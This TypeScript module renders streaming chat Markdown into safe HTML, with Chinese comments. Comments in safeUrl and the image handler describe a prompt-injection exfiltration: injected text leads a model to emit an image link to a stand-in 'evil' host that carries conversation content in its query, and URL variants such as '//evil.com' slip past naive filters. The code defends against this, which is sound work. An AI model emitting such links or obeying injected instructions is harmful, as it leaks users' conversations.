/**
 * 聊天气泡里的 Markdown：文本 → HTML 字符串。**只有字符串**，不碰 DOM。
 *
 * 从 gateway/ui/markdown.js 的前半段原样搬来（后半段——KaTeX / highlight.js / Mermaid 的按需
 * 加载、复制、下载、图片兜底——是浏览器的事，留在那儿）。设计照着 vercel/ai-chatbot 用的那套
 * （Streamdown + @streamdown/{code,math,mermaid,cjk}）：**为流式输出而写的 Markdown**：
 *
 * 1. **半截的语法不能露原文。** 渲染前先把「还没收口的记号」补上（healStream）。
 * 2. **按块记忆。** splitBlocks 把正文切成顶层块，调用方只重画变了的那一块。
 * 3. **默认不信任正文。** 原始 HTML 一律转义不透传，链接和图片只放行白名单协议（safeUrl）。
 *
 * 输出里的 `data-md="…"` / `data-md-act="…"` / `data-tex` 是给 Web 的 DOM 半边认的：公式、代码、
 * Mermaid 的「增强」在那边做。移动端拿 healStream / splitBlocks 喂自己的渲染器，或者拿 render
 * 的 HTML 喂 react-native-render-html。
 *
 * 两样东西由宿主给：界面文案的 `t`（「复制」「下载」这几个按钮），以及「人点过加载的站外图片」
 * 那张表（`loadedImages`，DOM 半边点一下就往里加，这边重画时据此不再变回按钮）。
 */
export interface MarkdownOptions {
  /** 界面文案。不给就原样用中文。 */
  t?: (zh: string) => string
}

export interface MarkdownRenderOptions {
  /** 为真时先补齐半截记号（见 healStream）。写完的历史消息别开——那会把正文里真实存在的落单星号也一起补掉。 */
  streaming?: boolean
}

export function createMarkdown(opts: MarkdownOptions = {}) {
  /** 界面文案走宿主的 t()。 */
  function L(zh: string): string {
    return opts.t ? opts.t(zh) : zh
  }

  const ESCAPES = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }
  function esc(s: any) {
    return String(s == null ? '' : s).replace(/[&<>"']/g, (c) => (ESCAPES as Record<string, string>)[c])
  }

  /**
   * 行内解析分好几趟，代码片段和公式必须在「转义 → 链接 → 强调」之前先抽走：
   * `a*b*c` 里的星号不是强调，`$x_1$` 里的下划线也不是。抽走时留一个私用区字符包着的
   * 数字当占位符——它躲得过后面每一趟正则（转义不碰它，强调不匹配纯数字），最后一步
   * 再换回来。
   */
  const MARK = '\uE000'
  const RE_HOLE = /\uE000(\d+)\uE000/g

  function hold(store: any, html: any) {
    store.push(html)
    return MARK + (store.length - 1) + MARK
  }

  function unhold(html: any, store: any) {
    // 占位符会嵌套（链接文字里有行内代码），所以要换到不动为止。
    let out = html
    for (let i = 0; i < 8 && out.indexOf(MARK) >= 0; i++) {
      out = out.replace(RE_HOLE, (m: any, n: any) => (store[Number(n)] == null ? '' : store[Number(n)]))
    }
    return out.split(MARK).join('')
  }

  /** 人点过「加载」的站外图片地址。只在这一页的内存里，刷新就忘（见 RE_IMG 那段）。 */
  const loadedImages = new Set()

  /** 判「这条相对地址是不是还在站内」用的假基地址。只用来比对源，不会出现在输出里。 */
  const RELATIVE_BASE = 'https://satu.invalid/'
  const RELATIVE_ORIGIN = 'https://satu.invalid'

  /** 只放行安全协议。模型写得出 `javascript:`，这里是唯一拦得住的地方。 */
  function safeUrl(raw: unknown, kind?: string): string {
    const s = String(raw || '')
      .trim()
      .replace(/^<|>$/g, '')
    if (!s) return ''
    if (/^(https?:\/\/|mailto:|tel:)/i.test(s)) return s
    if (kind === 'img' && /^data:image\/(png|jpe?g|gif|webp);base64,/i.test(s)) return s
    /**
     * 站内相对地址放行。**形状对了还不够，要按浏览器的解析器再问一遍「它落在哪个源」。**
     *
     * 光看开头那个 `/` 会漏一整类写法：`//evil.com` 是协议相对 URL，`/\evil.com` 里
     * 的反斜杠在 WHATWG 解析里等同斜杠，URL 中间的 tab 和换行则会被直接删掉——
     * `/<tab>/evil.com` 于是也成了 `//evil.com`。三种写法渲染出来都是一张自动加载的
     * 站外图片，不用点，正文里塞一段就能把对话内容顺着 query 带走。
     *
     * 所以拿一个假的基地址解析一遍：解析完还在同一个源，才是真的站内。
     */
    if (!/^(\/|\.{1,2}\/|#)/.test(s)) return ''
    try {
      if (new URL(s, RELATIVE_BASE).origin === RELATIVE_ORIGIN) return s
    } catch {}
    return ''
  }

  // ── 流式：把半截的记号补齐 ──────────────────────────────────────────
  /**
   * 只动**正文末尾**那一处没收口的记号，前面已经成型的部分一个字不改。
   *
   * 补 vs 藏，按「补出来像不像人写的」分：
   * - 围栏、`$$`、行内代码、加粗斜体删除线 —— 补收口记号。补早了内容照样在长，视觉上
   *   就是文字连续冒出来，不闪。
   * - 链接和图片写到一半（`[看这里](htt`）—— 整段藏掉。补不出有意义的地址，露出来是
   *   一段方括号加半截 URL，比空着更碍眼；写完了它自己会回来。
   */
  function healStream(src: string): string {
    let s = String(src == null ? '' : src)

    // 1. 围栏：奇数条说明最后一条还开着。围栏内的内容不做别的处理，直接收口返回。
    const fences = s.match(/^[ \t]{0,3}(?:`{3,}|~{3,})/gm)
    if (fences && fences.length % 2 === 1) {
      const open = fences[fences.length - 1].trim()
      return s + (s.endsWith('\n') ? '' : '\n') + open[0].repeat(Math.max(3, open.length))
    }

    // 2. 末尾半截的链接 / 图片：藏掉。
    s = s.replace(/!?\[[^\]\n]*\](?:\([^)\n]*)?$/, '')
    s = s.replace(/!?\[[^\]\n]*$/, '')

    // 3. 块级公式。
    if (((s.match(/\$\$/g) || []).length) % 2 === 1) s += '$$'

    // 4. 行内代码：最后一行的反引号成单。
    const lastLine = s.slice(s.lastIndexOf('\n') + 1)
    if (((lastLine.match(/`/g) || []).length) % 2 === 1) s += '`'

    // 5. 强调。长记号先补——`***` 拆成 `**` 再补 `*` 会错位。
    //
    // **数记号之前先把代码剔掉**：走到这一步围栏已经全部闭合（第 1 步开着就返回了）、
    // 最后一行的反引号也已成对，可 `a * b` 这种代码里的星号照样会被数进去，于是补出
    // 一个多余的 `*`，正文尾巴上就多一个星。围栏块整段去掉，行内代码按 \`…\` 去掉。
    const plain = s
      .split('\n')
      .filter(
        (() => {
          let fence = ''
          return (line) => {
            const m = /^[ \t]{0,3}(`{3,}|~{3,})/.exec(line)
            if (m && !fence) {
              fence = m[1]
              return false
            }
            if (m && fence && m[1][0] === fence[0] && m[1].length >= fence.length) {
              fence = ''
              return false
            }
            return !fence
          }
        })(),
      )
      .join('\n')
      .replace(/`[^`\n]*`/g, '')
    for (const mk of ['***', '~~', '**', '__']) {
      if ((plain.split(mk).length - 1) % 2 === 1) s += mk
    }
    // 单记号要先把成对的长记号剔掉再数，否则 `**粗**` 会被算成四个单星号。
    const bare = plain.replace(/\*\*\*|\*\*|__/g, '')
    if ((bare.split('*').length - 1) % 2 === 1) s += '*'
    return s
  }

  // ── 按块切：让调用方只重画变了的那一块 ────────────────────────────────
  /**
   * 把正文切成顶层块。围栏和块级公式不许被切开——切开了两半都不成立，重画时会看到半
   * 张图或半个公式。
   */
  function splitBlocks(src: string): string[] {
    const lines = String(src == null ? '' : src)
      .replace(/\r\n?/g, '\n')
      .split('\n')
    const out: any[] = []
    let buf: any[] = []
    let fence = ''
    let inMath = false

    const flush = () => {
      if (buf.length && buf.join('').trim()) out.push(buf.join('\n'))
      buf = []
    }

    for (const line of lines) {
      if (fence) {
        buf.push(line)
        if (new RegExp('^[ \\t]{0,3}' + fence[0] + '{' + fence.length + ',}[ \\t]*$').test(line)) {
          fence = ''
          flush()
        }
        continue
      }
      const open = /^[ \t]{0,3}(`{3,}|~{3,})/.exec(line)
      if (open) {
        flush()
        fence = open[1]
        buf.push(line)
        continue
      }
      if (/^[ \t]{0,3}\$\$/.test(line)) {
        if (inMath) {
          buf.push(line)
          inMath = false
          flush()
          continue
        }
        flush()
        buf.push(line)
        // 同一行开合（`$$x$$`）自成一块。
        if (/^[ \t]{0,3}\$\$[\s\S]*\$\$[ \t]*$/.test(line)) flush()
        else inMath = true
        continue
      }
      if (inMath) {
        buf.push(line)
        continue
      }
      if (!line.trim()) {
        flush()
        continue
      }
      buf.push(line)
    }
    flush()
    return out
  }

  // ── 行内 ───────────────────────────────────────────────────────────
  const RE_INLINE_CODE = /(`+)([\s\S]*?[^`])\1(?!`)/g
  const RE_TEX_PAREN = /\\\(([\s\S]+?)\\\)/g
  const RE_TEX_BRACKET = /\\\[([\s\S]+?)\\\]/g
  const RE_TEX_DOLLAR = /\$(?!\s)((?:\\.|[^$\n\\])+?)\$/g
  const RE_IMG = /!\[([^\]]*)\]\(\s*(<[^>]*>|[^\s)]+)(?:\s+["']([^"']*)["'])?\s*\)/g
  const RE_LINK = /\[([^\]]*)\]\(\s*(<[^>]*>|[^\s)]*)(?:\s+["']([^"']*)["'])?\s*\)/g
  const RE_AUTOLINK = /<((?:https?:\/\/|mailto:)[^\s<>]+)>/g
  const RE_BARE_URL = /(^|[\s(（【「])(https?:\/\/[^\s<>()（）【】「」]+[^\s<>()（）【】「」.,;:!?，。；：！？])/g

  function mathNode(tex: any, display: any) {
    const tag = display ? 'div' : 'span'
    return (
      '<' +
      tag +
      ' class="sw-math' +
      (display ? ' sw-math-block' : '') +
      '" data-md="math" data-display="' +
      (display ? '1' : '0') +
      '" data-tex="' +
      esc(tex) +
      '">' +
      // 兜底文字里**不带 $ 记号**。KaTeX 是异步拉的，带记号的话每个公式在渲染完成前都
      // 会先闪一下 `$$…$$`；不带的话看到的就是一行 TeX，CSS 已经把它标成等宽淡色，
      // 一眼就知道是「还没排版的公式」而不是正文写坏了。
      esc(tex) +
      '</' +
      tag +
      '>'
    )
  }

  /**
   * 行内解析。
   *
   * **强调这里故意不按 CommonMark 的 flanking 规则来。** 那套规则拿「前后是不是标点或
   * 空白」判断记号能不能开合，中文正文里 `**已完成**，接着说` 的收口记号后面贴着全角
   * 逗号，判定会飘——@streamdown/cjk 存在就是为了打这个补丁。这里换一条更笨但对中文
   * 更稳的规则：开口记号后面不贴空白、收口记号前面不贴空白，配对就成立，不看标点。
   */
  function inline(src: any, ctx: any) {
    const store = ctx.store
    const depth = ctx.depth || 0
    let s = String(src == null ? '' : src)

    // 1. 行内代码
    s = s.replace(RE_INLINE_CODE, (m, ticks, body) =>
      hold(store, '<code data-md="inline-code">' + esc(body.replace(/^ ([\s\S]*) $/, '$1')) + '</code>'),
    )

    // 2. 行内公式。`$` 也是货币符号：两头都不许贴空白，内容也不许是纯数字——
    //    「$100 到 $200」中间那段 `100 到 ` 尾部有空格，被挡在下面这条。
    s = s.replace(RE_TEX_PAREN, (m, tex) => hold(store, mathNode(tex, false)))
    s = s.replace(RE_TEX_BRACKET, (m, tex) => hold(store, mathNode(tex, true)))
    s = s.replace(RE_TEX_DOLLAR, (m, tex) => {
      if (/\s$/.test(tex) || /^[\d.,\s]*$/.test(tex)) return m
      return hold(store, mathNode(tex, false))
    })

    // 3. 图片与链接。链接文字要继续做行内解析（里面可能还有代码或强调）。
    s = s.replace(RE_IMG, (m, alt, url, title) => {
      const href = safeUrl(url, 'img')
      if (!href) return hold(store, esc(alt))
      /**
       * **站外图片不自动加载，点了才拉。**
       *
       * 图片是浏览器自己去取的，不用点：模型读到的网页或文档里藏一句指令，让它输出
       * `![](https://evil/?d=<对话里的内容>)`，渲染的那一刻内容就顺着 query 出去了。safeUrl
       * 那边挡住了相对地址的几种变形，可绝对的 https 地址本来就放行（CSP 的 img-src 也开着，
       * 理由见 gateway/src/http.ts），所以闸只能设在这里：先摆一颗写着域名的按钮，人点了
       * 才换成真的 <img>。点过的地址这一页里记着（loadedImages），重画时不再变回按钮。
       */
      if (/^https?:\/\//i.test(href) && !loadedImages.has(href)) {
        let host = ''
        try {
          host = new URL(href).host
        } catch {}
        return hold(
          store,
          '<button type="button" class="sw-md-remote-img" data-md="remote-image" data-md-act="load-image" data-src="' +
            esc(href) +
            '" data-alt="' +
            esc(alt) +
            '" title="' +
            esc(href) +
            '">' +
            esc(L('点击加载图片')) +
            (host ? '（' + esc(host) + '）' : '') +
            (alt ? '：' + esc(alt) : '') +
            '</button>',
        )
      }
      return hold(
        store,
        '<img data-md="image" src="' +
          esc(href) +
          '" alt="' +
          esc(alt) +
          '"' +
          (title ? ' title="' + esc(title) + '"' : '') +
          ' loading="lazy">',
      )
    })
    s = s.replace(RE_LINK, (m, text, url, title) => {
      const href = safeUrl(url, 'a')
      const label = depth > 3 ? esc(text) : inline(text, { store, depth: depth + 1 })
      if (!href) return hold(store, label)
      return hold(
        store,
        '<a data-md="link" href="' +
          esc(href) +
          '" target="_blank" rel="noopener noreferrer nofollow"' +
          (title ? ' title="' + esc(title) + '"' : '') +
          '>' +
          label +
          '</a>',
      )
    })
    s = s.replace(RE_AUTOLINK, (m, url) => {
      const href = safeUrl(url, 'a')
      if (!href) return m
      return hold(store, '<a data-md="link" href="' + esc(href) + '" target="_blank" rel="noopener noreferrer nofollow">' + esc(url) + '</a>')
    })
    s = s.replace(RE_BARE_URL, (m, pre, url) => {
      const href = safeUrl(url, 'a')
      if (!href) return m
      return (
        pre +
        hold(store, '<a data-md="link" href="' + esc(href) + '" target="_blank" rel="noopener noreferrer nofollow">' + esc(url) + '</a>')
      )
    })

    // 4. 剩下的全部转义。过了这一步，字符串里不可能再冒出标签。
    s = esc(s)

    // 5. 强调。长记号在前。
    s = s.replace(/\*\*\*(?!\s)([\s\S]+?)(?<!\s)\*\*\*/g, '<strong data-md="strong"><em>$1</em></strong>')
    s = s.replace(/(\*\*|__)(?!\s)([\s\S]+?)(?<!\s)\1/g, '<strong data-md="strong">$2</strong>')
    s = s.replace(/~~(?!\s)([\s\S]+?)(?<!\s)~~/g, '<del data-md="strike">$1</del>')
    s = s.replace(/\*(?!\s)([\s\S]+?)(?<!\s)\*/g, '<em data-md="emphasis">$1</em>')
    // 下划线只在词边界成立，否则 snake_case 的变量名会被切成斜体。
    s = s.replace(
      /(^|[\s(（【「>])_(?!\s)([\s\S]+?)(?<!\s)_(?=$|[\s)）】」<,.，。!！?？;；:：])/g,
      '$1<em data-md="emphasis">$2</em>',
    )

    // 6. 换行。聊天里单个换行也当换行——模型分行写就是想分行。
    s = s.replace(/ {2,}\n/g, '<br>').replace(/\n/g, '<br>')

    return unhold(s, store)
  }

  // ── 块级 ───────────────────────────────────────────────────────────
  const RE_FENCE = /^[ \t]{0,3}(`{3,}|~{3,})[ \t]*([^\n`]*)$/
  const RE_ATX = /^[ \t]{0,3}(#{1,6})[ \t]+(.*?)[ \t]*#*[ \t]*$/
  const RE_HR = /^[ \t]{0,3}(?:(?:\*[ \t]*){3,}|(?:-[ \t]*){3,}|(?:_[ \t]*){3,})$/
  const RE_BULLET = /^([ \t]*)([-*+])[ \t]+([\s\S]*)$/
  const RE_ORDERED = /^([ \t]*)(\d{1,9})([.)])[ \t]+([\s\S]*)$/
  const RE_QUOTE = /^[ \t]{0,3}>[ \t]?(.*)$/
  const RE_TABLE_DELIM = /^[ \t]{0,3}\|?[ \t]*:?-+:?[ \t]*(\|[ \t]*:?-+:?[ \t]*)*\|?[ \t]*$/
  const RE_SETEXT = /^[ \t]{0,3}(=+|-+)[ \t]*$/

  const HEAD_TAG = ['h1', 'h2', 'h3', 'h4', 'h5', 'h6']

  /** 这一行是不是某个块的开头。段落和引用的「懒延续」靠它决定在哪儿收住。 */
  function startsBlock(l: any) {
    return RE_FENCE.test(l) || RE_ATX.test(l) || RE_HR.test(l) || RE_QUOTE.test(l) || RE_BULLET.test(l) || RE_ORDERED.test(l) || /^[ \t]{0,3}\$\$/.test(l)
  }

  function indentOf(line: any) {
    let n = 0
    for (const ch of line) {
      if (ch === ' ') n += 1
      else if (ch === '\t') n += 4
      else break
    }
    return n
  }

  function toolBtn(act: any, label: any) {
    return '<button type="button" class="sw-tool" data-md-act="' + act + '" title="' + esc(label) + '">' + esc(label) + '</button>'
  }

  function codeFigure(lang: any, code: any, ctx: any) {
    const label = String(lang || '')
      .trim()
      .toLowerCase()
      .split(/\s+/)[0]
    if (label === 'mermaid') return mermaidFigure(code)
    if (label === 'math' || label === 'latex' || label === 'tex') return mathNode(code.trim(), true)
    const shown = label || 'text'
    return (
      '<figure class="sw-code" data-md="code-block" data-lang="' +
      esc(shown) +
      '">' +
      '<figcaption class="sw-code-head"><span class="sw-code-lang">' +
      esc(shown) +
      '</span><span class="sw-code-tools">' +
      toolBtn('copy', L('复制')) +
      toolBtn('download', L('下载')) +
      '</span></figcaption>' +
      '<pre class="sw-code-body"><code class="language-' +
      esc(shown) +
      '">' +
      esc(code.replace(/\n$/, '')) +
      '</code></pre></figure>'
    )
  }

  function mermaidFigure(code: any) {
    return (
      '<figure class="sw-mermaid" data-md="mermaid" data-view="diagram">' +
      '<figcaption class="sw-code-head"><span class="sw-code-lang">mermaid</span>' +
      '<span class="sw-code-tools">' +
      toolBtn('mermaid-view', L('源码')) +
      toolBtn('copy', L('复制')) +
      toolBtn('mermaid-svg', L('下载')) +
      '</span></figcaption>' +
      '<div class="sw-mermaid-canvas" data-state="pending"><span class="sw-mermaid-wait">' +
      esc(L('正在画图…')) +
      '</span></div>' +
      '<pre class="sw-mermaid-src"><code class="language-mermaid">' +
      esc(code.replace(/\n$/, '')) +
      '</code></pre></figure>'
    )
  }

  function splitRow(line: any) {
    const trimmed = line.trim().replace(/^\|/, '').replace(/\|[ \t]*$/, '')
    const cells = []
    let cur = ''
    for (let i = 0; i < trimmed.length; i++) {
      const ch = trimmed[i]
      if (ch === '\\' && trimmed[i + 1] === '|') {
        cur += '|'
        i++
        continue
      }
      if (ch === '|') {
        cells.push(cur.trim())
        cur = ''
        continue
      }
      cur += ch
    }
    cells.push(cur.trim())
    return cells
  }

  function tableHtml(head: any, align: any, rows: any, ctx: any) {
    const cell = (text: any, i: any, tag: any) =>
      '<' + tag + (align[i] ? ' style="text-align:' + align[i] + '"' : '') + '>' + inline(text, ctx) + '</' + tag + '>'
    return (
      '<div class="sw-table" data-md="table">' +
      '<div class="sw-table-tools">' +
      toolBtn('copy-table', L('复制表格')) +
      '</div>' +
      '<div class="sw-table-scroll"><table>' +
      '<thead><tr>' +
      head.map((c: any, i: any) => cell(c, i, 'th')).join('') +
      '</tr></thead><tbody>' +
      rows.map((r: any) => '<tr>' + head.map((_: any, i: any) => cell(r[i] == null ? '' : r[i], i, 'td')).join('') + '</tr>').join('') +
      '</tbody></table></div></div>'
    )
  }

  /** 一段行渲染成块级 HTML。列表项和引用的内容回头调它自己。 */
  function blocks(lines: any, ctx: any): string {
    const out = []
    let i = 0
    while (i < lines.length) {
      const line = lines[i]

      if (!line.trim()) {
        i++
        continue
      }

      // 围栏代码
      const fence = RE_FENCE.exec(line)
      if (fence) {
        const marker = fence[1]
        const close = new RegExp('^[ \\t]{0,3}' + marker[0] + '{' + marker.length + ',}[ \\t]*$')
        const body = []
        i++
        while (i < lines.length && !close.test(lines[i])) {
          body.push(lines[i])
          i++
        }
        i++ // 吃掉收口那行
        out.push(codeFigure(fence[2], body.join('\n'), ctx))
        continue
      }

      // 块级公式
      if (/^[ \t]{0,3}\$\$/.test(line)) {
        const same = /^[ \t]{0,3}\$\$([\s\S]*?)\$\$[ \t]*$/.exec(line)
        if (same) {
          out.push(mathNode(same[1].trim(), true))
          i++
          continue
        }
        const body = [line.replace(/^[ \t]{0,3}\$\$/, '')]
        i++
        while (i < lines.length && lines[i].indexOf('$$') < 0) {
          body.push(lines[i])
          i++
        }
        if (i < lines.length) body.push(lines[i].slice(0, lines[i].indexOf('$$')))
        i++
        out.push(mathNode(body.join('\n').trim(), true))
        continue
      }

      // 标题
      const atx = RE_ATX.exec(line)
      if (atx) {
        const tag = HEAD_TAG[atx[1].length - 1]
        out.push('<' + tag + ' data-md="heading-' + atx[1].length + '">' + inline(atx[2], ctx) + '</' + tag + '>')
        i++
        continue
      }

      // 分隔线。要排在列表前面——`- - -` 两边都能匹配。
      if (RE_HR.test(line)) {
        out.push('<hr data-md="rule">')
        i++
        continue
      }

      // 引用
      if (RE_QUOTE.test(line)) {
        const body = []
        while (i < lines.length) {
          const m = RE_QUOTE.exec(lines[i])
          if (m) {
            body.push(m[1])
            i++
            continue
          }
          // 懒延续：紧跟着的普通行仍属于引用，但下一个块的开头要收住。
          if (lines[i].trim() && !startsBlock(lines[i])) {
            body.push(lines[i].trim())
            i++
            continue
          }
          break
        }
        out.push('<blockquote data-md="blockquote">' + blocks(body, ctx) + '</blockquote>')
        continue
      }

      // 列表
      if (RE_BULLET.test(line) || RE_ORDERED.test(line)) {
        const res: any = listAt(lines, i, ctx)
        out.push(res.html)
        i = res.next
        continue
      }

      // 表格：本行有竖线，下一行是对齐行
      if (line.indexOf('|') >= 0 && i + 1 < lines.length && RE_TABLE_DELIM.test(lines[i + 1]) && lines[i + 1].indexOf('-') >= 0) {
        const head = splitRow(line)
        const align = splitRow(lines[i + 1]).map((c) => {
          const l = c.startsWith(':')
          const r = c.endsWith(':')
          return l && r ? 'center' : r ? 'right' : l ? 'left' : ''
        })
        i += 2
        const rows = []
        while (i < lines.length && lines[i].trim() && lines[i].indexOf('|') >= 0) {
          rows.push(splitRow(lines[i]))
          i++
        }
        out.push(tableHtml(head, align, rows, ctx))
        continue
      }

      // 段落：吃到空行或下一个块的开头为止
      const para = []
      while (i < lines.length && lines[i].trim()) {
        if (para.length && startsBlock(lines[i])) break
        // Setext 标题：`标题` 下面一行全是 = 或 -
        if (para.length === 1 && RE_SETEXT.test(lines[i])) {
          const level = lines[i].trim()[0] === '=' ? 1 : 2
          out.push('<h' + level + ' data-md="heading-' + level + '">' + inline(para[0], ctx) + '</h' + level + '>')
          para.length = 0
          i++
          break
        }
        para.push(lines[i].trim())
        i++
      }
      if (para.length) out.push('<p data-md="paragraph">' + inline(para.join('\n'), ctx) + '</p>')
    }
    return out.join('')
  }

  /**
   * 从 start 起的一整个列表。
   *
   * 缩进决定层级：比首项缩进多的行归到当前项里，回头交给 blocks 递归处理——所以嵌套
   * 列表、列表里的代码块和多段落都能正常出来。
   */
  function listAt(lines: any, start: any, ctx: any): any {
    const firstNum = RE_ORDERED.exec(lines[start])
    const ordered = !!firstNum
    const baseIndent = indentOf(lines[start])
    const startNo = ordered ? Number(firstNum[2]) : 1
    const items = []
    let i = start
    let cur = null
    let loose = false
    let blank = false

    while (i < lines.length) {
      const line = lines[i]
      if (!line.trim()) {
        blank = true
        if (cur) cur.push('')
        i++
        continue
      }
      const ind = indentOf(line)
      const bullet = RE_BULLET.exec(line)
      const num = RE_ORDERED.exec(line)
      const isItem = !!(bullet || num) && ind <= baseIndent + 1

      if (isItem) {
        if (items.length && ordered !== !!num) break // 换了记号类型就是另一个列表
        if (blank && cur) loose = true
        blank = false
        cur = [bullet ? bullet[3] : num![4]]
        items.push(cur)
        i++
        continue
      }
      if (ind > baseIndent && cur) {
        cur.push(line.slice(Math.min(ind, baseIndent + (ordered ? 3 : 2))))
        blank = false
        i++
        continue
      }
      // 空行之后没缩进 = 列表结束；没空行的话是段落懒延续。
      if (blank || !cur || startsBlock(line)) break
      cur.push(line.trim())
      i++
    }

    const html: string = items
      .map((body: any): string => {
        let text = body.join('\n').replace(/\n+$/, '')
        let task = ''
        const check = /^\[([ xX])\][ \t]+/.exec(text)
        if (check) {
          text = text.slice(check[0].length)
          task = '<input type="checkbox" disabled' + (check[1] === ' ' ? '' : ' checked') + '>'
        }
        const rows = text.split('\n')
        // 紧凑列表里，项开头那段文字不包 <p>——包了行距就散开，而且「甲」和它下面那层
        // 子列表之间会多出一个空行。开头之后真的有块（子列表、代码块）时才走 blocks。
        let inner
        if (loose) {
          inner = blocks(rows, ctx)
        } else {
          let k = 0
          while (k < rows.length && rows[k].trim() && !startsBlock(rows[k])) k++
          const lead = rows
            .slice(0, k)
            .map((r: any) => r.trim())
            .join('\n')
          inner = (lead ? inline(lead, ctx) : '') + (k < rows.length ? blocks(rows.slice(k), ctx) : '')
        }
        return '<li data-md="list-item"' + (task ? ' class="sw-task"' : '') + '>' + task + inner + '</li>'
      })
      .join('')

    const tag = ordered ? 'ol' : 'ul'
    return {
      html:
        '<' +
        tag +
        ' data-md="' +
        (ordered ? 'ordered-list' : 'unordered-list') +
        '"' +
        (ordered && startNo !== 1 ? ' start="' + startNo + '"' : '') +
        '>' +
        html +
        '</' +
        tag +
        '>',
      next: i,
    }
  }

  /**
   * 一段 Markdown → HTML 字符串。
   *
   * `opts.streaming` 为真时先补齐半截记号（见 healStream）。写完的历史消息别开——那会
   * 把正文里真实存在的落单星号也一起补掉。
   */
  function render(src: unknown, opts?: MarkdownRenderOptions): string {
    const streaming = !!(opts && opts.streaming)
    /**
     * **先把 U+E000 从正文里剔掉。**
     *
     * 那个私用区字符是行内解析的占位符记号（见 MARK）。正文是模型输出和工具结果，
     * 完全可以原样含着一段 `\uE00012\uE000`——unhold 会把它当成一个占位符去查表：
     * 下标越界就整段消失，撞上另一个真占位符则换成毫不相干的内容。不是注入（表里只有
     * 我们自己放进去的、已经安全的 HTML），但足以让一段正文凭空变样。
     */
    const raw = String(src == null ? '' : src).split(MARK).join('')
    const text = streaming ? healStream(raw) : raw
    if (!text.trim()) return ''
    const ctx = { store: [], depth: 0 }
    return blocks(text.replace(/\r\n?/g, '\n').split('\n'), ctx)
  }


  return { render, splitBlocks, healStream, esc, safeUrl, loadedImages }
}

export type Markdown = ReturnType<typeof createMarkdown>
